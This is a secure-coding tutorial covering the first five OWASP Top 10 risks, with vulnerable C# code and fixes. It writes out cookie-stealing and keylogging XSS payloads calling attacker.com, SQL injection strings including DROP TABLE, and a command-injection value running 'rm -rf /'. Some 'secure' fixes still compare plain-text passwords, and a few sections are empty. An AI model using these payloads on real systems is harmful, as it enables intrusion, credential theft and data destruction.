# Application Security Fundamentals Guide - Part 2
## OWASP Top 10 Vulnerabilities (Part 1)

> [!NOTE]
> This is Part 2 of a comprehensive 7-part guide on application security. This section covers the first half of the OWASP Top 10 most critical web application security risks.

---

## Table of Contents
1. [What is OWASP?](#what-is-owasp)
2. [A01: Broken Access Control](#a01-broken-access-control)
3. [A02: Cryptographic Failures](#a02-cryptographic-failures)
4. [A03: Injection](#a03-injection)
5. [A04: Insecure Design](#a04-insecure-design)
6. [A05: Security Misconfiguration](#a05-security-misconfiguration)

---

## What is OWASP?

**OWASP** = **O**pen **W**eb **A**pplication **S**ecurity **P**roject

**What it is:** A nonprofit organization focused on improving software security

**OWASP Top 10:** A regularly updated list of the most critical security risks to web applications


---

## A01: Broken Access Control

### What Is It?

**Simple Explanation:** Users can access things they shouldn't be able to.

**Technical:** Restrictions on what authenticated users can do are not properly enforced.

### Real-World Example

```mermaid
sequenceDiagram
    participant A as Attacker (User #123)
    participant S as Server
    participant DB as Database
    
    Note over A: Logged in as regular user
    A->>S: GET /api/users/456/profile
    S->>DB: SELECT * FROM users WHERE id=456
    DB->>S: User 456 data
    S->>A: ✅ Returns other user's data!
    
    Note over A,S: Should have checked if user 123<br/>is authorized to view user 456!
```



### Common Vulnerabilities

#### 1. Insecure Direct Object References (IDOR)

**Problem:** Accessing resources by changing IDs in URLs

```csharp
// ❌ VULNERABLE CODE
[HttpGet("api/orders/{orderId}")]
public IActionResult GetOrder(int orderId)
{
    var order = _db.Orders.Find(orderId);
    return Ok(order); // Returns ANY order without checking ownership!
}
```

**Attack:**
```
GET /api/orders/1001  ✅ My order
GET /api/orders/1002  ✅ Someone else's order! (Should be denied)
GET /api/orders/1003  ✅ Another person's order!
```

**Fix:**

```csharp
// ✅ SECURE CODE
[HttpGet("api/orders/{orderId}")]
[Authorize] // Must be authenticated
public IActionResult GetOrder(int orderId)
{
    var currentUserId = GetCurrentUserId();
    var order = _db.Orders
        .Where(o => o.Id == orderId && o.UserId == currentUserId)
        .FirstOrDefault();
    
    if (order == null)
    {
        return NotFound(); // Or Forbid() to avoid info leak
    }
    
    return Ok(order);
}
```

#### 2. Missing Function-Level Access Control

**Problem:** Not checking if user has permission to perform an action

```csharp
// ❌ VULNERABLE CODE
[HttpPost("api/users/{id}/make-admin")]
public IActionResult MakeAdmin(int id)
{
    var user = _db.Users.Find(id);
    user.Role = "Admin";
    _db.SaveChanges();
    return Ok(); // Anyone can make anyone an admin!
}
```

**Fix:**

```csharp
// ✅ SECURE CODE
[HttpPost("api/users/{id}/make-admin")]
[Authorize(Roles = "SuperAdmin")] // Only SuperAdmin can do this
public IActionResult MakeAdmin(int id)
{
    // Additional business logic checks
    if (!CanPromoteToAdmin(id))
    {
        return Forbid();
    }
    
    var user = _db.Users.Find(id);
    user.Role = "Admin";
    _db.SaveChanges();
    
    // Audit log
    _auditService.Log($"User {id} promoted to Admin by {GetCurrentUserId()}");
    
    return Ok();
}
```

#### 3. Path Traversal

**Problem:** Accessing files outside intended directory

```csharp
// ❌ VULNERABLE CODE
[HttpGet("api/files/{filename}")]
public IActionResult DownloadFile(string filename)
{
    var path = $"C:\\Files\\{filename}";
    return File(System.IO.File.ReadAllBytes(path), "application/octet-stream");
}
```

**Attack:**
```
GET /api/files/report.pdf  ✅ Normal
GET /api/files/../../Windows/System32/config/SAM  ❌ Access sensitive files!
```

**Fix:**

```csharp
// ✅ SECURE CODE
[HttpGet("api/files/{filename}")]
[Authorize]
public IActionResult DownloadFile(string filename)
{
    // Validate filename
    if (string.IsNullOrWhiteSpace(filename) || 
        filename.Contains("..") || 
        filename.Contains("/") || 
        filename.Contains("\\"))
    {
        return BadRequest("Invalid filename");
    }
    
    var allowedDirectory = "C:\\Files\\";
    var fullPath = Path.Combine(allowedDirectory, filename);
    
    // Verify the resolved path is still within allowed directory
    var resolvedPath = Path.GetFullPath(fullPath);
    if (!resolvedPath.StartsWith(allowedDirectory))
    {
        return Forbid();
    }
    
    // Check user owns this file
    if (!_fileService.UserOwnsFile(GetCurrentUserId(), filename))
    {
        return Forbid();
    }
    
    if (!System.IO.File.Exists(resolvedPath))
    {
        return NotFound();
    }
    
    return File(System.IO.File.ReadAllBytes(resolvedPath), "application/octet-stream");
}
```

### Prevention Checklist

- [ ] Implement proper authorization checks on all endpoints
- [ ] Deny by default (fail closed)
- [ ] Use role-based or attribute-based access control
- [ ] Verify user owns the resource they're accessing
- [ ] Disable directory listing on web servers
- [ ] Log access control failures for monitoring
- [ ] Use indirect references (GUIDs instead of sequential IDs)

---

## A02: Cryptographic Failures

### What Is It?

**Simple Explanation:** Sensitive data is not properly protected with encryption or is encrypted poorly.

**Technical:** Failures related to cryptography (or lack thereof) that lead to exposure of sensitive data.

### Common Mistakes

#### 1. Storing Passwords in Plain Text

```csharp
// ❌ TERRIBLE - Never do this!
public class User
{
    public int Id { get; set; }
    public string Username { get; set; }
    public string Password { get; set; } // Stored as "MyPassword123"
}

public void CreateUser(string username, string password)
{
    var user = new User
    {
        Username = username,
        Password = password // Storing plain text!
    };
    _db.Users.Add(user);
    _db.SaveChanges();
}
```

**Why it's bad:**
- Database breach = all passwords exposed
- Admins can see passwords
- Cannot change hashing algorithm later

**Fix:**

```csharp
// ✅ CORRECT - Hash passwords
public class User
{
    public int Id { get; set; }
    public string Username { get; set; }
    public string PasswordHash { get; set; } // Hashed value
}

public void CreateUser(string username, string password)
{
    var user = new User
    {
        Username = username,
        PasswordHash = BCrypt.Net.BCrypt.HashPassword(password)
        // Result: $2a$11$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
    };
    _db.Users.Add(user);
    _db.SaveChanges();
}

public bool VerifyPassword(string username, string password)
{
    var user = _db.Users.FirstOrDefault(u => u.Username == username);
    if (user == null) return false;
    
    return BCrypt.Net.BCrypt.Verify(password, user.PasswordHash);
}
```

#### 2. Using Weak Hashing Algorithms

```csharp
// ❌ BAD - MD5 is broken, SHA1 is weak
public string HashPassword(string password)
{
    using (var md5 = MD5.Create())
    {
        var hash = md5.ComputeHash(Encoding.UTF8.GetBytes(password));
        return Convert.ToBase64String(hash);
    }
}
```

**Why it's bad:**
- MD5 and SHA1 are cryptographically broken
- No salt = rainbow table attacks
- Too fast = brute force is easy

**Fix:**

```csharp
// ✅ GOOD - Use bcrypt, scrypt, or Argon2
public string HashPassword(string password)
{
    // bcrypt automatically handles salt and uses strong algorithm
    return BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
}

// Or use ASP.NET Core Identity's PasswordHasher
var hasher = new PasswordHasher<User>();
string hash = hasher.HashPassword(user, password);
```

#### 3. Transmitting Sensitive Data Over HTTP


**Fix:** Always use HTTPS for:
- Login forms
- Any page with sensitive data
- API endpoints
- Cookies with sensitive information

```csharp
// Force HTTPS in ASP.NET Core
public void ConfigureServices(IServiceCollection services)
{
    services.AddHttpsRedirection(options =>
    {
        options.RedirectStatusCode = StatusCodes.Status307TemporaryRedirect;
        options.HttpsPort = 443;
    });
    
    services.AddHsts(options =>
    {
        options.MaxAge = TimeSpan.FromDays(365);
        options.IncludeSubDomains = true;
        options.Preload = true;
    });
}

public void Configure(IApplicationBuilder app)
{
    app.UseHttpsRedirection();
    app.UseHsts();
}
```

#### 4. Weak Encryption

```csharp
// ❌ BAD - DES is obsolete, hardcoded key
public class WeakEncryption
{
    private static readonly byte[] Key = Encoding.UTF8.GetBytes("12345678"); // 8 bytes
    
    public string Encrypt(string plaintext)
    {
        using (var des = DES.Create()) // DES is weak!
        {
            des.Key = Key; // Hardcoded key!
            // ... encryption logic
        }
    }
}
```

**Fix:**

```csharp
// ✅ GOOD - Use AES with proper key management
public class StrongEncryption
{
    private readonly byte[] _key; // From configuration/key vault
    
    public StrongEncryption(IConfiguration config)
    {
        // Load from secure location (Azure Key Vault, AWS KMS, etc.)
        _key = Convert.FromBase64String(config["EncryptionKey"]);
    }
    
    public string Encrypt(string plaintext)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = _key;
            aes.GenerateIV(); // Random IV for each encryption
            
            using (var encryptor = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            {
                // Write IV first (needed for decryption)
                ms.Write(aes.IV, 0, aes.IV.Length);
                
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                using (var writer = new StreamWriter(cs))
                {
                    writer.Write(plaintext);
                }
                
                return Convert.ToBase64String(ms.ToArray());
            }
        }
    }
}
```

#### 5. Exposing Sensitive Data in URLs

```csharp
// ❌ BAD - Sensitive data in URL
[HttpGet("reset-password")]
public IActionResult ResetPassword(string token, string newPassword)
{
    // URL: /reset-password?token=abc123&newPassword=MyNewPass
    // This gets logged in:
    // - Browser history
    // - Server logs
    // - Proxy logs
    // - Referrer headers
}
```

**Fix:**

```csharp
// ✅ GOOD - Use POST with body
[HttpPost("reset-password")]
public IActionResult ResetPassword([FromBody] ResetPasswordRequest request)
{
    // Data in POST body, not URL
    // Still use HTTPS!
}

public class ResetPasswordRequest
{
    public string Token { get; set; }
    public string NewPassword { get; set; }
}
```

### Prevention Checklist

- [ ] Use HTTPS everywhere (enforce with HSTS)
- [ ] Hash passwords with bcrypt, scrypt, or Argon2
- [ ] Never store sensitive data unnecessarily
- [ ] Encrypt sensitive data at rest
- [ ] Use strong encryption algorithms (AES-256)
- [ ] Manage keys securely (Key Vault, not in code)
- [ ] Disable caching for sensitive data
- [ ] Use secure random number generators

---

## A03: Injection

### What Is It?

**Simple Explanation:** Attackers insert malicious code into your application by manipulating input.

**Technical:** Untrusted data is sent to an interpreter as part of a command or query.

### Types of Injection


### 1. SQL Injection (SQLi)

**How it works:**

```csharp
// ❌ VULNERABLE CODE
public User GetUser(string username, string password)
{
    string query = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";
    return _db.ExecuteQuery<User>(query).FirstOrDefault();
}
```

**Normal use:**
```sql
Username: john
Password: secret123

SELECT * FROM Users WHERE Username = 'john' AND Password = 'secret123'
```

**Attack:**
```sql
Username: admin'--
Password: anything

SELECT * FROM Users WHERE Username = 'admin'--' AND Password = 'anything'
                                          ↑
                                      Comment out the rest!
Result: Logs in as admin without password!
```

**More dangerous attacks:**

```sql
-- Drop entire table
Username: '; DROP TABLE Users;--
SELECT * FROM Users WHERE Username = ''; DROP TABLE Users;--' AND Password = 'x'

-- Dump all user data
Username: ' OR '1'='1
SELECT * FROM Users WHERE Username = '' OR '1'='1' AND Password = 'x'
-- Returns ALL users because 1=1 is always true!
```

**Fix: Use Parameterized Queries**

```csharp
// ✅ SECURE CODE - Parameterized query
public User GetUser(string username, string password)
{
    string query = "SELECT * FROM Users WHERE Username = @username AND Password = @password";
    return _db.ExecuteQuery<User>(query, new { username, password }).FirstOrDefault();
}

// ✅ Or use Entity Framework (built-in protection)
public User GetUser(string username, string password)
{
    return _dbContext.Users
        .Where(u => u.Username == username && u.Password == password)
        .FirstOrDefault();
}

// ✅ With Dapper
public User GetUser(string username, string password)
{
    return _connection.QueryFirstOrDefault<User>(
        "SELECT * FROM Users WHERE Username = @Username AND Password = @Password",
        new { Username = username, Password = password }
    );
}
```

**Why parameterized queries work:**


### 2. Cross-Site Scripting (XSS)

**What:** Injecting malicious JavaScript into web pages viewed by other users

**Types:**

#### Reflected XSS

**Attack Flow:**


**Vulnerable code:**

```csharp
// ❌ VULNERABLE
[HttpGet]
public IActionResult Search(string query)
{
    ViewBag.Query = query; // Not escaped!
    return View();
}
```

```html
<!-- View -->
<h1>Search results for: @ViewBag.Query</h1>
<!--
URL: /search?query=<script>alert('XSS')</script>
Output: <h1>Search results for: <script>alert('XSS')</script></h1>
The script executes!
-->
```

**Attack examples:**

```html
<!-- Steal cookies -->
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Redirect to phishing site -->
<script>
    window.location = 'https://fake-login.com';
</script>

<!-- Keylogger -->
<script>
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/log?key=' + e.key);
    });
</script>
```

**Fix: Encode Output**

```csharp
// ✅ SECURE - Razor automatically encodes
[HttpGet]
public IActionResult Search(string query)
{
    ViewBag.Query = query; // Razor will encode this
    return View();
}
```

```html
<!-- Razor View -->
<h1>Search results for: @ViewBag.Query</h1>
<!--
Input: <script>alert('XSS')</script>
Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
Displayed as text, not executed!
-->

<!-- If you need raw HTML (dangerous!), use Html.Raw() carefully -->
<div>@Html.Raw(TrustedContent)</div> <!-- Only for trusted sources! -->
```

**In JavaScript/React:**

```javascript
// ❌ VULNERABLE
function SearchResults({ query }) {
    return <div dangerouslySetInnerHTML={{ __html: query }} />;
}

// ✅ SECURE
function SearchResults({ query }) {
    return <div>{query}</div>; // React escapes by default
}
```

#### Stored XSS (Persistent)

**More dangerous:** Script is stored in database and executed for all users

```csharp
// ❌ VULNERABLE
[HttpPost]
public IActionResult CreateComment(string text)
{
    var comment = new Comment { Text = text };
    _db.Comments.Add(comment);
    _db.SaveChanges();
    return Ok();
}

// When displaying:
@foreach (var comment in Model.Comments)
{
    @Html.Raw(comment.Text) // ❌ Executes any scripts in comments!
}
```

**Fix:**

```csharp
// ✅ SECURE - Sanitize on input and encode on output
[HttpPost]
public IActionResult CreateComment(string text)
{
    // Option 1: Strip HTML tags
    var sanitized = Regex.Replace(text, "<.*?>", string.Empty);
    
    // Option 2: Use a library like HtmlSanitizer
    var sanitizer = new HtmlSanitizer();
    var sanitized = sanitizer.Sanitize(text);
    
    var comment = new Comment { Text = sanitized };
    _db.Comments.Add(comment);
    _db.SaveChanges();
    return Ok();
}

// When displaying, still encode:
@foreach (var comment in Model.Comments)
{
    <div>@comment.Text</div> <!-- Razor encodes automatically -->
}
```

### 3. Command Injection

**What:** Executing system commands through application input

```csharp
// ❌ EXTREMELY VULNERABLE
[HttpPost("convert-image")]
public IActionResult ConvertImage(string filename)
{
    var command = $"convert {filename} output.png";
    var process = Process.Start("cmd.exe", $"/c {command}");
    process.WaitForExit();
    return Ok();
}
```

**Attack:**

```
POST /convert-image
filename: input.jpg; rm -rf / # or del /f /s /q C:\

Executes: convert input.jpg output.png; rm -rf /
          Deletes entire filesystem!
```

**Fix:**

```csharp
// ✅ SECURE
[HttpPost("convert-image")]
public IActionResult ConvertImage(string filename)
{
    // 1. Validate input strictly
    if (!Regex.IsMatch(filename, @"^[a-zA-Z0-9_\-]+\.(jpg|png)$"))
    {
        return BadRequest("Invalid filename");
    }
    
    // 2. Use arguments array (doesn't invoke shell)
    var startInfo = new ProcessStartInfo
    {
        FileName = "convert",
        Arguments = $"{filename} output.png",
        UseShellExecute = false, // Important!
        RedirectStandardOutput = true
    };
    
    using (var process = Process.Start(startInfo))
    {
        process.WaitForExit();
    }
    
    return Ok();
}

// ✅ BETTER: Use a library instead of system commands
public IActionResult ConvertImage(string filename)
{
    // Use ImageSharp or similar library
    using (var image = Image.Load(filename))
    {
        image.SaveAsPng("output.png");
    }
    return Ok();
}
```

### Prevention Checklist

**SQL Injection:**
- [ ] Use parameterized queries (never concatenate SQL)
- [ ] Use ORMs (Entity Framework, Dapper with parameters)
- [ ] Whitelist allowed values when possible
- [ ] Apply least privilege database permissions

**XSS:**
- [ ] Encode output (Razor does this automatically)
- [ ] Sanitize rich text input (HtmlSanitizer library)
- [ ] Use Content Security Policy headers
- [ ] Set HttpOnly flag on cookies
- [ ] Validate input length and format

**Command Injection:**
- [ ] Avoid system commands when possible (use libraries)
- [ ] Validate input with strict whitelists
- [ ] Never use shell invocation (UseShellExecute = false)
- [ ] Use argument arrays, not string concatenation

---

## A04: Insecure Design

### What Is It?

**Simple Explanation:** Security vulnerabilities that exist in the design phase, before code is written.

**Technical:** Missing or ineffective security controls in the design and architecture.

### Examples

#### 1. No Rate Limiting → Brute Force Attacks

**Insecure Design:**

```csharp
// ❌ No protection against brute force
[HttpPost("login")]
public IActionResult Login(string username, string password)
{
    var user = _userService.ValidateCredentials(username, password);
    if (user != null)
    {
        return Ok(GenerateToken(user));
    }
    return Unauthorized();
}

// Attacker can try millions of passwords:
// POST /login { username: "admin", password: "password1" }
// POST /login { username: "admin", password: "password2" }
// ... (unlimited attempts)
```

**Secure Design:**

```csharp
// ✅ Rate limiting + account lockout
[HttpPost("login")]
[RateLimit(MaxAttempts = 5, WindowMinutes = 15)]
public IActionResult Login(string username, string password)
{
    // Check if account is locked
    if (_accountLockoutService.IsLocked(username))
    {
        return StatusCode(429, "Account temporarily locked. Try again later.");
    }
    
    var user = _userService.ValidateCredentials(username, password);
    if (user != null)
    {
        _accountLockoutService.ResetAttempts(username);
        return Ok(GenerateToken(user));
    }
    
    // Record failed attempt
    var attempts = _accountLockoutService.IncrementAttempts(username);
    if (attempts >= 5)
    {
        _accountLockoutService.LockAccount(username, TimeSpan.FromMinutes(15));
        _notificationService.SendSecurityAlert(username);
    }
    
    return Unauthorized();
}
```

#### 2. No Transaction Limits → Resource Exhaustion

**Insecure Design:**

```csharp
// ❌ No limits on money transfer amounts
[HttpPost("transfer")]
public IActionResult Transfer(decimal amount, string toAccount)
{
    // No validation on amount!
    _accountService.Transfer(GetCurrentUser(), toAccount, amount);
    return Ok();
}

// Attacker could transfer $999,999,999.99 if they bypass client validation
```

**Secure Design:**

```csharp
// ✅ Business logic validation
[HttpPost("transfer")]
public IActionResult Transfer(decimal amount, string toAccount)
{
    var user = GetCurrentUser();
    var account = _accountService.GetAccount(user);
    
    // Multiple layers of validation
    var validationResult = _transferValidator.Validate(new TransferRequest
    {
        Amount = amount,
        FromAccount = account,
        ToAccount = toAccount
    });
    
    if (!validationResult.IsValid)
    {
        return BadRequest(validationResult.Errors);
    }
    
    _accountService.Transfer(account, toAccount, amount);
    return Ok();
}

public class TransferValidator
{
    public ValidationResult Validate(TransferRequest request)
    {
        var errors = new List<string>();
        
        // Daily limit
        if (_transferService.GetDailyTotal(request.FromAccount) + request.Amount > 10000)
        {
            errors.Add("Daily transfer limit exceeded");
        }
        
        // Single transaction limit
        if (request.Amount > 5000)
        {
            errors.Add("Single transfer limit is $5,000");
        }
        
        //balance check
        if (request.FromAccount.Balance < request.Amount)
        {
            errors.Add("Insufficient funds");
        }
        
        return new ValidationResult { IsValid = errors.Count == 0, Errors = errors };
    }
}
```

### Prevention

> [!IMPORTANT]
> **Secure Design Principles:**
> 
> 1. **Threat Modeling:** Identify threats during design
> 2. **Security Requirements:** Define security needs upfront
> 3. **Defense in Depth:** Multiple layers of security
> 4. **Fail Securely:** Default to secure state on errors
> 5. **Separation of Duties:** Require approval for sensitive operations

---

## A05: Security Misconfiguration

### What Is It?

**Simple Explanation:** The application or server is not configured securely.

**Technical:** Missing security hardening, unnecessary features enabled, default credentials, verbose error messages.

### Common Misconfigurations

#### 1. Verbose Error Messages

```csharp
// ❌ Production showing detailed errors
{
    "error": "SqlException: Invalid column name 'Passwrod'",
    "stackTrace": "at System.Data.SqlClient.SqlConnection.OnError...",
    "query": "SELECT * FROM Users WHERE Username = @user AND Passwrod = @pass",
    "connectionString": "Server=prod-db.internal;User=sa;Password=..."
}
// Exposes: Database structure, typos, connection strings!
```

**Fix:**

```csharp
// ✅ appsettings.Production.json
{
  "DetailedErrors ": false,
  "Environment": "Production"
}

// ✅ Global exception handler
public class GlobalExceptionHandler : IExceptionHandler
{
    public async Task<bool> TryHandleAsync(HttpContext context, Exception exception, CancellationToken cancellationToken)
    {
        _logger.LogError(exception, "Unhandled exception occurred");
        
        // Return generic message to user
        context.Response.StatusCode = 500;
        await context.Response.WriteAsJsonAsync(new
        {
            error = "An error occurred processing your request",
            requestId = context.TraceIdentifier // For support to look up logs
        });
        
        return true;
    }
}
```

#### 2. Default Credentials

```yaml
# ❌ Default admin account
admin / admin
administrator / password
root / root
```

**Fix:**
- Force password change on first login
- Disable default accounts
- Use strong, unique credentials
- Never commit credentials to source control

#### 3. Unnecessary Features Enabled

```xml
<!-- ❌ Directory browsing enabled -->
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" />
  </system.webServer>
</configuration>
<!-- Attacker can see all files in directories! -->
```

**Fix:**

```xml
<!-- ✅ Disable unnecessary features -->
<configuration>
  <system.webServer>
    <directoryBrowse enabled="false" />
    
    <!-- Remove server header -->
    <security>
      <requestFiltering removeServerHeader="true" />
    </security>
  </system.webServer>
</configuration>
```

```csharp
//✅ Remove unnecessary headers
app.Use(async (context, next) =>
{
    context.Response.Headers.Remove("Server");
    context.Response.Headers.Remove("X-Powered-By");
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Add("X-Frame-Options", "DENY");
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    await next();
});
```

### Prevention Checklist

- [ ] Disable directory listing
- [ ] Remove default accounts and credentials
- [ ] Disable unnecessary features and services
- [ ] Keep all software updated
- [ ] Use minimal, hardened images (containers)
- [ ] Generic error messages in production
- [ ] Remove server version headers
- [ ] Implement security headers
- [ ] Regular security audits and scans

---

## Summary Table

| Vulnerability | Risk | Common Cause | Quick Fix |
|--------------|------|--------------|-----------|
| **Broken Access Control** | Critical | Missing authorization checks | Verify user owns resource |
| **Cryptographic Failures** | High | Weak/no encryption | Use HTTPS, hash passwords with bcrypt |
| **Injection** | Critical | Unsanitized input | Use parameterized queries |
| **Insecure Design** | High | Missing security requirements | Threat modeling, business logic validation |
| **Misconfiguration** | Medium | Default settings | Hardening, disable unnecessary features |

---

## Next Steps

📚 **Continue to [Part 3: OWASP Top 10 Vulnerabilities (Part 2)](Part3-OWASP-Top10-Part2.md)**

This next section covers:
- Vulnerable and outdated components
- Identification and authentication failures
- Software and data integrity failures
- Security logging and monitoring failures
- Server-side request forgery (SSRF)

---

*Part 2 of 7 - OWASP Top 10 Vulnerabilities (Part 1)*
